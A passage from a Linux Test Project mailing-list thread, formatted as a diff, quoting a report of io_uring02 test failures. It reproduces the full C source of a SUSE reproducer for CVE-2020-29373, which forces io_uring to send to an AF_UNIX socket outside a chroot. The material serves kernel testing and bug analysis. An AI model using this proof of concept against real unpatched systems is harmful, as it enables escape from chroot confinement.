-+	.test_all = brk_down_vmas,
-+};
+> 
+> io_uring02 failure:
+> io_uring02.c:148: TFAIL: Write outside chroot succeeded.
+> 
+> The original reproducer (exits with 4) failure:
+> error: cqe 255: res=16, but expected -ENOENT
+> error: Test failed
+> 
+> Quoting Nicolai: This is likely to be a real issue with the kernel commit.
+> The test tries to do a sendmsg() to an AF_UNIX socket outside
+> a chroot. So the res=16 indicates that it was able to look it up and send 16
+> bytes to it.
+> 
+> Then 907d1df30a51 ("io_uring: fix wqe->lock/completion_lock deadlock") from v5.11-rc6 causes
+> different errors errors:
+> io_uring02.c:161: TFAIL: Write outside chroot result not found
+> io_uring02.c:164: TFAIL: Wrong number of entries in completion queue
+> 
+> According to Nicolai this could be a test bug (test tries to race io_uring into
+> processing the sendmsg request asynchronously from a worker thread (where is
+> the vulnerability). That was is a needed workaround due missing IOSQE_ASYNC on
+> older kernels (< 5.5).
+> 
+> Tips and comments are welcome.
+> 
+> Kind regards,
+> Petr
+> 
+> [1] https://github.com/linux-test-project/ltp/tree/master/testcases/kernel/syscalls/io_uring/io_uring02.c
+> 
+> /*
+>  * repro-CVE-2020-29373 -- Reproducer for CVE-2020-29373.
+>  *
+>  * Copyright (c) 2021 SUSE
+>  * Author: Nicolai Stange <nstange@suse.de>
+>  *
+>  * This program is free software; you can redistribute it and/or
+>  * modify it under the terms of the GNU General Public License
+>  * as published by the Free Software Foundation; either version 2
+>  * of the License, or (at your option) any later version.
+>  *
+>  * This program is distributed in the hope that it will be useful,
+>  * but WITHOUT ANY WARRANTY; without even the implied warranty of
+>  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+>  * GNU General Public License for more details.
+>  *
+>  * You should have received a copy of the GNU General Public License
+>  * along with this program; if not, see <http://www.gnu.org/licenses/>.
+>  */
+> 
+> #define _GNU_SOURCE
+> #include <unistd.h>
+> #include <syscall.h>
+> #include <linux/io_uring.h>
+> #include <stdio.h>
+> #include <sys/mman.h>
+> #include <sys/socket.h>
+> #include <sys/un.h>
+> #include <fcntl.h>
+> #include <errno.h>
+> #include <inttypes.h>
+> #include <stdlib.h>
+> #include <sys/types.h>
+> #include <sys/wait.h>
+> 
+> static int io_uring_setup(__u32 entries, struct io_uring_params * p)
+> {
+> 	return (int)syscall(__NR_io_uring_setup, entries, p);
+> }
+> 
+> static int io_uring_enter(unsigned int fd, __u32 to_submit,
+> 			  __u32 min_complete, unsigned int flags ,
+> 			  sigset_t * sig, size_t sigsz)
+> {
+> 	return (int)syscall(__NR_io_uring_enter, fd, to_submit,
+> 			    min_complete, flags, sig, sigsz);
+> }
+> 
+> /*
+>  * This attempts to make the kernel issue a sendmsg() to
+>  * path from io_uring's async io_sq_wq_submit_work().
+>  *
+>  * Unfortunately, IOSQE_ASYNC is available only from kernel version
+>  * 5.6 onwards. To still force io_uring to process the request
+>  * asynchronously from io_sq_wq_submit_work(), queue a couple of
+>  * auxiliary requests all failing with EAGAIN before. This is
+>  * implemented by writing repeatedly to an auxiliary O_NONBLOCK
+>  * AF_UNIX socketpair with a small SO_SNDBUF.
+>  */
+> static int try_sendmsg_async(const char * const path)
+> {
+> 	int r, i, j;
+> 
+> 	int aux_sock[2];
+> 	int snd_sock;
+> 	int sockoptval;
+> 	char sbuf[16] = { 0 };
+> 	struct iovec siov = { .iov_base = &sbuf, .iov_len = sizeof(sbuf) };
+> 	struct msghdr aux_msg = {
+> 		.msg_name = NULL,
+> 		.msg_namelen = 0,
+> 		.msg_iov = &siov,
+> 		.msg_iovlen = 1,
+> 	};
+> 	struct sockaddr_un addr = { 0 };
+> 	struct msghdr msg = {
+> 		.msg_name = &addr,
+> 		.msg_namelen = sizeof(addr),
+> 		.msg_iov = &siov,
+> 		.msg_iovlen = 1,
+> 	};
+> 
+> 	struct io_uring_params iour_params = { 0 };
+> 	int iour_fd;
+> 	void *iour_sqr_base;
+> 	__u32 *iour_sqr_phead;
+> 	__u32 *iour_sqr_ptail;
+> 	__u32 *iour_sqr_pmask;
+> 	__u32 *iour_sqr_parray;
+> 	struct io_uring_sqe *iour_sqes;
+> 	struct io_uring_sqe *iour_sqe;
+> 	void *iour_cqr_base;
+> 	__u32 *iour_cqr_phead;
+> 	__u32 *iour_cqr_ptail;
+> 	__u32 *iour_cqr_pmask;
+> 	struct io_uring_cqe *iour_cqr_pcqes;
+> 	__u32 iour_sqr_tail;
+> 	__u32 iour_cqr_tail;
+> 	__u32 n_cqes_seen;
+> 
+> 	r = socketpair(AF_UNIX, SOCK_DGRAM, 0, aux_sock);
+> 	if (r < 0) {
+> 		perror("socketpair()");
+> 		return 1;
+> 	}
+> 
+> 	sockoptval = 32 + sizeof(sbuf);
+> 	r = setsockopt(aux_sock[1], SOL_SOCKET, SO_SNDBUF, &sockoptval,
+> 		       sizeof(sockoptval));
+> 	if (r < 0) {
+> 		perror("setsockopt(SO_SNDBUF)");
+> 		goto close_aux_sock;
+> 	}
+> 
+> 	r = fcntl(aux_sock[1], F_SETFL, O_NONBLOCK);
+> 	if (r < 0) {
+> 		perror("fcntl(F_SETFL, O_NONBLOCK)");
+> 		goto close_aux_sock;
+> 	}
+> 
+> 	snd_sock = socket(AF_UNIX, SOCK_DGRAM, 0);
+> 	if (snd_sock < 0) {
+> 		perror("socket(AF_UNIX)");
+> 		r = -1;
+> 		goto close_aux_sock;
+> 	}
+> 
+> 	addr.sun_family = AF_UNIX;
+> 	strcpy(addr.sun_path, path);
+> 
+> 	iour_fd = io_uring_setup(512, &iour_params);
+> 	if (iour_fd < 0) {
+> 		perror("io_uring_setup()");
+> 		r = -1;
+> 		goto close_socks;
+> 	}
+> 
+> 	iour_sqr_base = mmap(NULL,
+> 			     (iour_params.sq_off.array +
+> 			      iour_params.sq_entries * sizeof(__u32)),
+> 			     PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE,
+> 			     iour_fd, IORING_OFF_SQ_RING);
+> 	if (iour_sqr_base == MAP_FAILED) {
+> 		perror("mmap(IORING_OFF_SQ_RING)");
+> 		r = -1;
+> 		goto close_iour;
+> 	}
+> 
+> 	iour_sqr_phead = iour_sqr_base + iour_params.sq_off.head;
+> 	iour_sqr_ptail = iour_sqr_base + iour_params.sq_off.tail;
+> 	iour_sqr_pmask = iour_sqr_base + iour_params.sq_off.ring_mask;
+> 	iour_sqr_parray = iour_sqr_base + iour_params.sq_off.array;
+> 
+> 	iour_sqes = mmap(NULL,
+> 			 iour_params.sq_entries * sizeof(struct io_uring_sqe),
+> 			 PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE,
+> 			 iour_fd, IORING_OFF_SQES);
+> 	if (iour_sqes == MAP_FAILED) {
+> 		perror("mmap(IORING_OFF_SQES)");
+> 		r = -1;
+> 		goto close_iour;
+> 	}
+> 
+> 	iour_cqr_base =
+> 		mmap(NULL,
+> 		     (iour_params.cq_off.cqes +
+> 		      iour_params.cq_entries * sizeof(struct io_uring_cqe)),
+> 		     PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE,
+> 		     iour_fd, IORING_OFF_CQ_RING);
+> 	if (iour_cqr_base == MAP_FAILED) {
+> 		perror("mmap(IORING_OFF_CQ_RING)");
+> 		r = -1;
+> 		goto close_iour;
+> 	}
+> 
+> 	iour_cqr_phead = iour_cqr_base + iour_params.cq_off.head;
+> 	iour_cqr_ptail = iour_cqr_base + iour_params.cq_off.tail;
+> 	iour_cqr_pmask = iour_cqr_base + iour_params.cq_off.ring_mask;
+> 	iour_cqr_pcqes = iour_cqr_base + iour_params.cq_off.cqes;
+> 
+> 	/*
+> 	 * First add the auxiliary sqes supposed to fail
+> 	 * with -EAGAIN ...
+> 	 */
+> 	iour_sqr_tail = *iour_sqr_ptail;
+> 	for (i = 0, j = iour_sqr_tail; i < 255; ++i, ++j) {
+> 		iour_sqe = &iour_sqes[i];
+> 		*iour_sqe = (struct io_uring_sqe){0};
+> 		iour_sqe->opcode = IORING_OP_SENDMSG;
+> 		iour_sqe->flags = IOSQE_IO_DRAIN;
+> 		iour_sqe->fd = aux_sock[1];
+> 		iour_sqe->addr = (__u64)&aux_msg;
+> 		iour_sqe->user_data = i;
+> 		iour_sqr_parray[j & *iour_sqr_pmask] = i;
+> 	}
+> 
+> 	/*
+> 	 * ... followed by the actual one supposed
+> 	 * to fail with -ENOENT.
+> 	 */
+> 	iour_sqe = &iour_sqes[255];
+> 	*iour_sqe = (struct io_uring_sqe){0};
+> 	iour_sqe->opcode = IORING_OP_SENDMSG;
+> 	iour_sqe->flags = IOSQE_IO_DRAIN;
+> 	iour_sqe->fd = snd_sock;
+> 	iour_sqe->addr = (__u64)&msg;
+> 	iour_sqe->user_data = 255;
+> 	iour_sqr_parray[j & *iour_sqr_pmask] = 255;
+> 
+> 	iour_sqr_tail += 256;
+> 	__atomic_store(iour_sqr_ptail, &iour_sqr_tail, __ATOMIC_RELEASE);
+> 
+> 	r = io_uring_enter(iour_fd, 256, 256, IORING_ENTER_GETEVENTS, NULL, 0);
+> 	if (r < 0) {
+> 		perror("io_uring_enter");
+> 		goto close_iour;
+> 	}
+> 
+> 	if (r != 256) {
+> 		fprintf(stderr,
+> 			"error: io_uring_enter(): unexpected return value\n");
+> 		r = 1;
+> 		goto close_iour;
+> 	}
+> 
+> 	r = 0;
+> 	n_cqes_seen = 0;
+> 	__atomic_load(iour_cqr_ptail, &iour_cqr_tail, __ATOMIC_ACQUIRE);
+> 	for(i = *iour_cqr_phead; i != iour_cqr_tail; ++i) {
+> 		const struct io_uring_cqe *cqe;
+> 
+> 		cqe = &iour_cqr_pcqes[i & *iour_cqr_pmask];
+> 		++n_cqes_seen;
+> 
+> 		if (cqe->user_data != 255) {
+> 			if (cqe->res < 0 && cqe->res != -EAGAIN) {
+> 				r = r < 2 ? 2 : r;
+> 				fprintf(stderr,
+> 					"error: cqe %" PRIu64 ": res=%" PRId32 "\n",
+> 					cqe->user_data, cqe->res);
+> 			}
+> 		} else if (cqe->res != -ENOENT) {
+> 			r = 3;
+> 			fprintf(stderr,
+> 				"error: cqe %" PRIu64 ": res=%" PRId32 ", but expected -ENOENT\n",
+> 				cqe->user_data, cqe->res);
+> 		}
+> 	}
+> 	__atomic_store(iour_cqr_ptail, &iour_cqr_tail, __ATOMIC_RELEASE);
+> 
+> 	if (n_cqes_seen != 256) {
+> 		fprintf(stderr, "error: unexpected number of io_uring cqes\n");
+> 		r = 4;
+> 	}
+> 
+> close_iour:
+> 	close(iour_fd);
+> close_socks:
+> 	close(snd_sock);
+> close_aux_sock:
+> 	close(aux_sock[0]);
+> 	close(aux_sock[1]);
+> 
+> 	return r;
+> }
+> 
+> 
+> int main(int argc, char *argv[])
+> {
+> 	int r;
+> 	char tmpdir[] = "/tmp/tmp.XXXXXX";
+> 	int rcv_sock;
+> 	struct sockaddr_un addr = { 0 };
+> 	pid_t c;
+> 	int wstatus;
+> 
+> 	if (!mkdtemp(tmpdir)) {
+> 		perror("mkdtemp()");
+> 		return 1;
+> 	}
+> 
+> 	rcv_sock = socket(AF_UNIX, SOCK_DGRAM, 0);
+> 	if (rcv_sock < 0) {
+> 		perror("socket(AF_UNIX)");
+> 		r = 1;
+> 		goto rmtmpdir;
+> 	}
+> 
+> 	addr.sun_family = AF_UNIX;
+> 	snprintf(addr.sun_path, sizeof(addr.sun_path), "%s/sock", tmpdir);
+> 
+> 	r = bind(rcv_sock, (struct sockaddr *)&addr,
+> 		 sizeof(addr));
+> 	if (r < 0) {
+> 		perror("bind()");
+> 		close(rcv_sock);
+> 		r = 1;
+> 		goto rmtmpdir;
+> 	}
+> 
+> 	c = fork();
+> 	if (!c) {
+> 		close(rcv_sock);
+> 
+> 		if (chroot(tmpdir)) {
+> 			perror("chroot()");
+> 			return 1;
+> 		}
+> 
+> 		r = try_sendmsg_async(addr.sun_path);
+> 		if (r < 0) {
+> 			/* system call failure */
+> 			r = 1;
+> 		} else if (r) {
+> 			/* test case failure */
+> 			r += 1;
+> 		}
+> 
+> 		return r;
+> 	}
+> 
+> 	if (waitpid(c, &wstatus, 0) == (pid_t)-1) {
+> 		perror("waitpid()");
+> 		r = 1;
+> 		goto rmsock;
+> 	}
+> 
+> 	if (!WIFEXITED(wstatus)) {
+> 		fprintf(stderr, "child got terminated\n");
+> 		r = 1;
+> 		goto rmsock;
+> 	}
+> 
+> 	r = WEXITSTATUS(wstatus);
+> 	if (r > 1)
+> 		fprintf(stderr, "error: Test failed\n");
+> 
+> rmsock:
+> 	close(rcv_sock);
+> 	unlink(addr.sun_path);
+> 
+> rmtmpdir:
+> 	rmdir(tmpdir);
+> 
+> 	return r;
+> }
+> 
+
 -- 
-2.28.0
+Pavel Begunkov
 
 -- 
 Mailing list info: https://lists.linux.it/listinfo/ltp
